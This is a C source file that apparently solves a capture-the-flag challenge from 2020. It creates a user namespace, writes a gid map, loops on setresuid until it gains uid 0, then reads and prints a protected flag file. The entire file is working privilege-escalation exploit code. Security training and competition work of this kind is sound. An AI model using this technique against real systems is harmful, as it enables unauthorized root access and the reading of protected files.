/*
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 *     Unless required by applicable law or agreed to in writing, software
 *     distributed under the License is distributed on an "AS IS" BASIS,
 *     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *     See the License for the specific language governing permissions and
 *     limitations under the License.
 */
#define _GNU_SOURCE
#include <sched.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <string.h>
#include <sys/mount.h>
#include <stdio.h>
#include <err.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/prctl.h>

int check(int res, const char *msg) {
  if (res == -1) err(1, "%s", msg);
  return res;
}
int main() {
  int pid = check(syscall(SYS_clone, CLONE_NEWUSER|SIGCHLD, 0, 0, 0, 0), "clone");
  if (!pid) {
    int gidmap = check(open("/proc/self/gid_map", O_WRONLY), "open(gidmap)");
    if (write(gidmap, "0 0 1", 5) != 5) {
      err(1, "write(gidmap)");
    }
    puts("waiting for uid 0");
    if (open("/home/user/flag", O_RDONLY) != -1) {
      errx(1, "open(/home/user/flag) should fail at this point, challenge broken??");
    }
    //while(1) sleep(1);
    while(setresuid(0, 0, 0) != 0);
    puts("got uid 0!");
    fflush(stdout);
    int fd = open("/home/user/flag", O_RDONLY);
    printf("fd: %d\n", fd);
    char buf[1024];
    read(fd, buf, sizeof(buf));
    printf("flag: \"%s\"", buf);
    return 0;
  }
  while (1) sleep(1);
}
